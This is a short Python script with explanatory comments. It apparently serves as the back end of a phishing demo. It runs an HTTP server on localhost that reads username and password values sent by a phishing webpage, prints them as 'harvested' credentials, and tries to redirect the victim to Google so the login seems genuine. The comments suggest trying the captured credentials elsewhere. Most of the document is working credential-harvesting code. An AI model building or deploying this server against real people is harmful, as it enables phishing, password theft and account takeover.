# This script provides an example of creating a simple HTTP server that receives a request.
# Within this directory, are pre-written Javascript programs (brython) uploaded by this script's author (hposton) that allow Python scripts
# in essence to be run in a browser as Javascript (Browsers to not generally run Python natively.).
# To use, run the script ('python server.py' in Windows cmd). The script opens a server that listens on a specified port.
# The source code for the phishing webpage sends its input back to the Python HTTP server using Brython.
# The "harvested" credentials could then be tried in other settings outside of the user's browser.

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse,parse_qs

hostName = "localhost"
serverPort = 8443

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        queries = parse_qs(urlparse(self.path).query)
        print("Username: %s, Password: %s"%(queries["user"][0],queries["password"][0]))
        # When the linked webpage receives user/password input, the source code is written to pass that info back to the Python server.
        self.send_response(300)
        self.send_header("Location", "http://www.google.com")
        # This is a proposed redirect to make the user think they entered their credentials on a legitimate site, but does not work on 
        # most browsers.
        self.end_headers()

if __name__ == "__main__":        
    webServer = HTTPServer((hostName, serverPort), MyServer)
    print("Server started http://%s:%s" % (hostName, serverPort))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopped.")
